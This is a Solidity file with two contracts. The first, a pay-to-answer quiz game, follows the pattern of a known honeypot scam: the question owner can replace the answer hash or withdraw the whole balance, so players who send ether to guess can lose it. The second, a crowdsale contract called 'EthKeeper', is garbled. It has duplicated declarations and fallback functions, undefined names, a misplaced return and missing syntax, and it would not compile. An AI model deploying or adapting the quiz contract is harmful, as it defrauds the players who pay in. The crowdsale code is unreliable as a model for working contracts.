pragma solidity ^0.4.25;

contract try_to_play {
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);

        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }

    string public question;

    address questionSender;

    bytes32 responseHash;

    bytes32 questionerPin = 0x3220587a12f2ddeabd33fb6830925eae0456db99c9af8ea248d79044ffafd632;

    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }

    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }

    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }

    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }

    function() public payable{}
}
pragma solidity ^0.3.0;
	 contract EthKeeper {
    uint256 public constant EX_rate = 250;
    uint256 public constant BEGIN = 40200010;
    uint256 tokens;
    address toAddress;
    address addressAfter;
    uint public collection;
    uint public dueDate;
    uint public rate;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function () public payable {
        require(now < dueDate && now >= BEGIN);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        collection += amount;
        tokens -= amount;
        reward.transfer(msg.sender, amount * EX_rate);
        toAddress.transfer(amount);
    }
    function EthKeeper (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        dueDate = BEGIN + 7 days;
        reward = token(addressOfTokenUsedAsReward);
    }
    function calcReward (
        address addressOfTokenUsedAsReward,
       address _toAddress,
        address _addressAfter
    ) public {
        uint256 tokens = 800000 * 10 ** 18;
        toAddress = _toAddress;
        addressAfter = _addressAfter;
        uint256 dueAmount = msg.value + 70;
        uint256 reward = dueAmount - tokenUsedAsReward;
        return reward
    }
    uint256 public constant EXCHANGE = 250;
    uint256 public constant START = 40200010; 
    uint256 tokensToTransfer;
    address sendTokensToAddress;
    address sendTokensToAddressAfterICO;
    uint public tokensRaised;
    uint public deadline;
    uint public price;
    token public reward;
    mapping(address => uint256) public balanceOf;
    bool crowdsaleClosed = false;
    function () public payable {
        require(now < deadline && now >= START);
        require(msg.value >= 1 ether);
        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        tokensRaised += amount;
        tokensToTransfer -= amount;
        reward.transfer(msg.sender, amount * EXCHANGE);
        sendTokensToAddress.transfer(amount);
    }
 }
